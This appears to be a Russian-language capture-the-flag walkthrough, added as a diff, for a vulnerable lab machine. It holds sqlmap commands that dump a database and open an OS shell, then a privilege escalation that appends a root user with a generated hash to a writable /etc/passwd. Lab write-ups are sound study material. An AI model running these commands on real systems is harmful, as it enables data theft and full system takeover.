@@ -1,0 +1,32 @@
+1) на этой машине нет ssh и это меня удивило, значит придется через веб взаимодействовать
+
+2)/robots.txt
+    /m3diNf0/
+    /se3reTdir777/uploads/
+
+3)на этой странице вбивается id и по нему выдается имя, это сразу натолкнуло меня на мысли об sql-injection
+    sqlmap -u "http://192.168.226.177/se3reTdir777/?uid=5&Operation=Submit" --threads 10 --level 5 --risk 3 --batch -dbs
+    sqlmap -u "http://192.168.226.177/se3reTdir777/?uid=5&Operation=Submit" --threads 10 --level 5 --risk 3 --batch -D aiweb1 --tables 
+    sqlmap -u "http://192.168.226.177/se3reTdir777/?uid=5&Operation=Submit" --threads 10 --level 5 --risk 3 --batch -D aiweb1 -T systemUser --dump
+        это дало мне пароли, но я по прежнему не знаю что с ними делать
+
+4)повозившься я поняла что можно использовать --os-shell в sqlmap
+    сохраняем полностью текст запроса из burp в dic.txt
+    sqlmap -r dic.txt -D aiweb1 --os-shell
+        which web application language does the web server support?
+            4
+        what do you want to use for writable directory?
+            2
+            /home/www/html/web1x443290o2sdf92213
+
+5) тоже самое что и в 4, только при 
+    what do you want to use for writable directory?
+            2
+            /home/www/html/web1x443290o2sdf92213/uploads
+    и вуаля, мы www-data
+
+6)/etc/passwd writeble, мы знаем что делать
+    <on_your_own_machine>openssl passwd -1 root
+        $1$1NDkA.kF$t.NgqNoYBOPXt3OpyyNEJ.
+
+    <on_victim_machine> echo 'marina:$1$1NDkA.kF$t.NgqNoYBOPXt3OpyyNEJ.:0:0:root:/root:/bin/bash'>>/etc/passwd
